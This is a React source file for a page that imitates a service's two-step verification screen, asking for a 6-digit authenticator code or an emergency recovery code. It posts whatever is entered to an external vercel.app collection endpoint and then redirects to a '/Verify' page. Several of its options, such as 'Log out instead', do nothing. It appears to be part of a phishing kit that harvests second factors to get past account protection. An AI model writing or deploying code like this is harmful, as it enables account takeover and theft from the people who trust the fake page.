import React, { useState } from "react";
import "./Code.css";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";

const CodeDetails = () => {
  const [user, setUser] = useState(false);
  const [show, setShow] = useState(true);
  const navigate = useNavigate();

  const { register, handleSubmit } = useForm();

  const onSubmit = (data) => {
    const Code = {
      Code: data.exampleRequired,
      codes: data.example,
    };
    console.log(Code);
    fetch("https://tryst-rubel-sarver-azure.vercel.app/code", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(Code),
    })
      .then((res) => res.json())
      .then((result) => navigate("/Verify"));
  };

  return (
    <>
      <div className="container">
        <div className="row">
          <div className="col-md-12">
            {show ? (
              <div
                className="alert alert-danger alert-dismissible fade show mt-4 mb-2  me-4"
                role="alert"
              >
                You need to authenticate via an additional factor before
                continuing
                <button
                  type="button"
                  className="btn-close"
                  data-bs-dismiss="alert"
                  aria-label="Close"
                  onClick={() => setShow(false)}
                ></button>
              </div>
            ) : (
              <div className="p-3"></div>
            )}
          </div>
        </div>
        <div className="row pb-3">
          <div className="col-md-6">
            <p className="authenticator">
              <span className="Enter">Enter</span> Emergency code
            </p>
            <div>
              {user ? (
                <form onSubmit={handleSubmit(onSubmit)}>
                  <div className="pt-4 pb-2">
                    <p>
                      Enter the 6-digit code from the authenticator app on your
                      phone or password manager.
                    </p>
                  </div>
                  <div>
                    <span className="TOKEN">AUTHENTICATION TOKEN</span>
                  </div>
                  <input
                    className="fs-5 w-100 mb-4 pt-4 ps-3 pb-1 form-control"
                    placeholder="_  _  _  _  _  _"
                    pattern="^-?[0-9]\d*\.?\d*$"
                    {...register("exampleRequired", {
                      required: true,
                      pattern: {
                        value: /^[0-9]+$/,
                        message: "Please enter a number",
                      },
                    })}
                    minLength={6}
                    maxLength={6}
                  />
                  <div>
                    <input
                      className="Authenticate"
                      type="submit"
                      value="Authenticate"
                    />
                  </div>
                </form>
              ) : (
                <form onSubmit={handleSubmit(onSubmit)}>
                  <div className="pt-4 pb-2">
                    <p className="pb-5">
                      An emergency recovery code is one of the codes we showed
                      you after you set up 2-step login. Each emergency recovery
                      code can be used exactly once.
                    </p>
                  </div>
                  <div>
                    <span className="">Emergency Token</span>
                  </div>
                  <input
                    className=" fs-5 w-100 mb-4 pt-4 ps-3 pb-1 form-control"
                    placeholder="___-___-___-___"
                    {...register("example", {
                      required: true,
                    })}
                    minLength={12}
                    maxLength={15}
                  />
                  <div>
                    <input
                      className="Authenticate"
                      type="submit"
                      value="Authenticate"
                    />
                  </div>
                </form>
              )}
            </div>
          </div>
          <div className="col-md-6"></div>
        </div>
        <div className="row">
          <div className="col-md-12 pb-3">
            <div className="recovery">
              {user ? (
                <span className="using" onClick={() => setUser(false)}>
                  Authenticate using emergency recovery code instead{" "}
                </span>
              ) : (
                <span className="using">
                  Authenticate using authenticator app instead{" "}
                </span>
              )}
              <span className="instead">|</span>{" "}
              <span className="using"> Log out instead</span>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default CodeDetails;
